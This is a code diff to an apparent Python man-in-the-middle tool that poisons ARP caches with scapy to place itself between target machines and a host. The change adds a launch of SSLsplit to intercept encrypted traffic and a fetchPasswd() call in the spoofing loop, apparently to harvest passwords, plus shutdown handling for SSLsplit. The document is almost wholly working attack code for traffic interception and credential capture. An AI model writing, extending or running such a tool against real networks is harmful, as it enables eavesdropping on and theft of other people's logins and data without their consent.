@@ -1,7 +1,7 @@
 import scapy.all as scapy
 import time
 import sys
-from MITM.MITM_misc import getMask1Bits
+from MITM.MITM_misc import getMask1Bits, runSSLSplit
 
 def getGatewayIP():
     result = scapy.conf.route.route("0.0.0.0")[2]
@@ -111,6 +111,9 @@ if __name__ == "__main__":
     verbose = False
     # enable ip forwarding
     enable_ip_route()
+
+    sslSplitPid = runSSLSplit()
+
     try:
         while True:
             for target in targets:
@@ -118,6 +121,7 @@ if __name__ == "__main__":
                 spoof(target, host, devices, verbose)
                 # telling the `host` that we are the `target`
                 spoof(host, target, devices, verbose)
+            fetchPasswd()
             time.sleep(1)
     except KeyboardInterrupt:
         print("[!] Detected CTRL+C ! restoring the network, please wait...")
@@ -125,3 +129,7 @@ if __name__ == "__main__":
             restore(target, host, devices, verbose)
             restore(host, target, devices, verbose)
         print("[+] Arp Spoof Stopped")
+
+        print("[!] Turning off sslsplit, please wait...")
+        sslSplitPid.terminate()
+        print("[+] SSLsplit Stopped")
